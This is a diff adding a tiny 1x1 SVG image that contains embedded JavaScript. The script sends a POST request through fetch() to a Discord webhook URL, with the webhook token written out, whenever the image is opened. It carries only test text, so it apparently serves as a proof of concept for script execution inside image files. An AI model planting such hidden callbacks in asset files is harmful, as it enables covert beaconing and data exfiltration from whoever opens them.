@@ -1,0 +1,18 @@
+<svg width="1" height="1" xmlns="http://www.w3.org/2000/svg">
+    <script type="text/javascript">
+      const payload = {
+        content: 'This is a webhook message from an SVG!',
+      };
+  
+      fetch('https://discord.com/api/webhooks/1147974816364773396/gm8dPpS572olAb-UVzxe0NqKXErzCYOU56ofS-OHESDhnm9BAh4rSBlweE3ZIx4b5A8W', {
+        method: 'POST',
+        headers: {
+          'content': {
+            'username': 'test',
+            'content': 'Hello World!'
+        }
+        },
+      })
+    </script>
+  </svg>
+  
